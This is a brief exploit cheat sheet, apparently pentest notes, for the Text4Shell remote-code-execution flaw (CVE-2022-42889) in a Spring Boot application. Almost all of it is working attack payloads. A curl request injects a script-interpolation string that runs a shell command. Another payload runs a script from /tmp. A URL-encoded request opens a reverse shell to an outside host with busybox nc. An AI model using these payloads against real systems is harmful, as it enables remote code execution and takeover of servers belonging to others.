# SpringBoot - CVE-2022-42889 - Text4Shell RCE

[image]

https://github.com/sunnyvale-it/CVE-2022-42889-PoC

```bash
curl http://localhost:8080/text4shell/attack\?search\=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27touch%20%2Ftmp%2Fp0wned%27%29%7D
Search results for: ${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/p0wned')}%
```

```
${script:javascript:java.lang.Runtime.getRuntime().exec('bash /tmp/rev.sh')}
```

Reverse shell:

```
http://192.168.204.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27busybox%20nc%20192.168.45.249%201234%20-e%20sh%27%29%7D
```
